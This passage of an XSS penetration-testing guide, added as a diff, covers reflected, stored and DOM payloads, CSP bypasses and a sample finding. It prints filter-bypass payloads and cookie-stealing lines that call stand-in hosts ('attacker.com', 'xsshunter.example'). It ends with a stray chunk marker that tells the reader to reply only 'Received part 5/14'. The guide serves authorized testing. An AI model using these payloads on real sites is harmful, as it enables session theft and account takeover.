+
+- Authorized scope defining the target web application and acceptable testing activities
+- Burp Suite Professional with XSS-focused extensions (XSS Validator, Reflector, Active Scan++)
+- Browser with developer tools and XSS testing extensions (HackBar, XSS Hunter)
+- XSS Hunter or Burp Collaborator for out-of-band payload verification
+- SecLists XSS payload lists and custom payloads for WAF bypass scenarios
+
+
+> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.
+
+## Workflow
+
+### Step 1: Input and Output Mapping
+
+Map every location where user input enters and is rendered by the application:
+
+- **Reflected inputs**: Test every URL parameter, search field, error message, and HTTP header value that is reflected in the response
+- **Stored inputs**: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages
+- **DOM inputs**: Identify client-side JavaScript that reads from `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, or `localStorage` and writes to the DOM
+- **Output context identification**: For each reflected input, determine the rendering context:
+  - HTML body: `<div>USER_INPUT</div>`
+  - HTML attribute: `<input value="USER_INPUT">`
+  - JavaScript string: `var x = 'USER_INPUT';`
+  - URL context: `<a href="USER_INPUT">`
+  - CSS context: `<div style="color: USER_INPUT">`
+
+### Step 2: Reflected XSS Testing
+
+Test reflected injection points with context-appropriate payloads:
+
+- **HTML body context**: `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
+- **HTML attribute context**: `" onfocus=alert(1) autofocus="`, `" onmouseover=alert(1) "`, `"><script>alert(1)</script>`
+- **JavaScript string context**: `';alert(1)//`, `\';alert(1)//`, `</script><script>alert(1)</script>`
+- **URL/href context**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
+- **Inside HTML comments**: `--><script>alert(1)</script><!--`
+- **Filter bypass payloads** (when basic payloads are blocked):
+  - Case variation: `<ScRiPt>alert(1)</sCrIpT>`
+  - Event handlers: `<details open ontoggle=alert(1)>`
+  - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`
+  - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
+
+### Step 3: Stored XSS Testing
+
+Test persistent storage points that render input to other users:
+
+- Submit XSS payloads to every stored input field identified in Step 1
+- Use a unique identifier in each payload to track which inputs trigger: `<script>alert('XSS-PROFILE-001')</script>`
+- Check all locations where the stored input is rendered (the same input may appear on multiple pages)
+- Test file upload features with HTML files containing JavaScript, SVG files with embedded scripts, and filenames containing XSS payloads
+- Test rich text editors by injecting payloads through the raw HTML mode or by manipulating the POST data after the client-side editor sanitizes
+- Use XSS Hunter payloads (`"><script src=https://yourxsshunter.xss.ht></script>`) for blind stored XSS where the payload fires in an admin panel or internal tool you cannot directly access
+
+### Step 4: DOM-Based XSS Testing
+
+Analyze client-side JavaScript for unsafe DOM manipulation:
+
+- **Source identification**: Search JavaScript for dangerous sources that read attacker-controlled input:
+  - `document.location`, `document.URL`, `document.referrer`
+  - `location.hash`, `location.search`, `location.href`
+  - `window.name`, `postMessage` event data
+- **Sink identification**: Search for dangerous sinks that write to the DOM:
+  - `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
+  - `eval()`, `setTimeout()`, `setInterval()`, `Function()`
+  - `element.setAttribute()` with event handlers, `jQuery.html()`, `.append()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)
+- **Trace data flow**: Follow the path from source to sink. If user-controlled input reaches a dangerous sink without proper sanitization, DOM XSS exists.
+- **Framework-specific testing**: Test React `dangerouslySetInnerHTML`, Angular template injection (`{{constructor.constructor('alert(1)')()}}`), Vue `v-html` directive
+
+### Step 5: CSP Bypass and Advanced Exploitation
+
+Test Content Security Policy effectiveness and demonstrate real-world impact:
+
+- **CSP analysis**: Review the CSP header for weaknesses:
+  - `unsafe-inline` in script-src allows inline scripts
+  - `unsafe-eval` allows eval() and similar functions
+  - Wildcard domains (`*.googleapis.com`) may host JSONP endpoints usable for CSP bypass
+  - `base-uri` not set allows `<base>` tag injection to redirect relative script loads
+- **JSONP bypass**: If CSP allows a domain with JSONP endpoints, use `<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>`
+- **Impact demonstration**:
+  - Session hijacking: `<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>`
+  - Credential phishing: Inject a fake login form overlay that submits to the attacker's server
+  - Keylogging: Inject JavaScript that captures keystrokes on the page
+  - Account takeover: Use XSS to change the victim's email address and trigger a password reset
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **Reflected XSS** | Non-persistent XSS where the injected payload is included in the server's response to the same request, requiring the victim to click a crafted URL |
+| **Stored XSS** | Persistent XSS where the payload is saved on the server and served to other users who view the affected page |
+| **DOM-Based XSS** | XSS that occurs entirely in the browser when client-side JavaScript reads attacker-controlled data and writes it to a dangerous DOM sink |
+| **Content Security Policy** | HTTP response header that restricts which sources the browser can load scripts, styles, and other resources from, providing defense-in-depth against XSS |
+| **Output Encoding** | Converting special characters to their HTML entity equivalents (e.g., `<` to `&lt;`) to prevent the browser from interpreting user input as code |
+| **Sink** | A JavaScript function or DOM property that can cause code execution or HTML rendering if attacker-controlled data reaches it unsanitized |
+
+## Tools & Systems
+
+- **Burp Suite Professional**: HTTP proxy with active scanning for reflected and stored XSS, plus Repeater and Intruder for manual payload testing
+- **XSS Hunter**: Hosted service that generates payloads which phone home with screenshots, cookies, and DOM content when triggered, essential for blind stored XSS
+- **DOMPurify**: Client-side sanitization library used by developers to prevent XSS; testers should test for bypass techniques against the deployed version
+- **Browser Developer Tools**: Console, Network, and Elements tabs for tracing DOM-based XSS data flows and testing payloads in real-time
+
+## Common Scenarios
+
+### Scenario: Stored XSS in Customer Support Ticket System
+
+**Context**: An e-commerce platform has a customer support system where customers submit tickets that are viewed by support agents in an internal admin panel. The ticket submission form accepts HTML formatting.
+
+**Approach**:
+1. Submit a support ticket with a unique XSS Hunter payload in the ticket description
+2. The payload fires when a support agent views the ticket in the admin panel, sending a callback with the agent's session cookie, page DOM, and screenshot
+3. Use the captured admin session cookie to access the admin panel as the support agent
+4. From the admin panel, access customer records, order data, and refund functionality
+5. Document the attack chain: customer submits ticket -> agent views ticket -> XSS fires -> session stolen -> admin panel compromised
+6. Test if CSP would have prevented the attack (in this case, no CSP header was present)
+
+**Pitfalls**:
+- Only testing for `<script>alert(1)</script>` and missing XSS that fires through event handlers or in non-HTML contexts
+- Not testing stored XSS in features that render to administrative users (support tickets, user profiles viewed by admins)
+- Ignoring DOM-based XSS in single-page applications where the server-side code is secure but client-side rendering is vulnerable
+- Not checking for XSS in HTTP headers (Referer, User-Agent) that may be logged and rendered in admin dashboards
+
+## Output Format
+
+```
+## Finding: Stored XSS in Support Ticket Description
+
+**ID**: XSS-002
+**Severity**: High (CVSS 8.1)
+**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)
+**Parameter**: description (POST body)
+**XSS Type**: Stored (persistent)
+
+**Description**:
+The support ticket description field does not sanitize HTML input before storing
+it in the database. When a support agent views the ticket in the admin panel, the
+unsanitized HTML is rendered in the agent's browser, allowing arbitrary JavaScript
+execution in the context of the admin application.
+
+**Proof of Concept**:
+Submitted ticket with payload:
+<img src=x onerror="fetch('https://xsshunter.example/callback?c='+document.cookie)">
+
+The payload fired when the agent viewed the ticket, exfiltrating the admin session
+cookie to the XSS Hunter server.
+
+**Impact**:
+An attacker can steal the session tokens of support agents and administrators,
+gaining access to the admin panel with privileges to view customer PII, process
+refunds, and modify orders. Affects all 23 support agents who view customer tickets.
+
+**Remediation**:
+1. Implement output encoding using a context-aware library (OWASP Java Encoder,
+   DOMPurify for client-side rendering)
+
+-----
+[END PART 5/14] — رد غير "Received part 5/14"
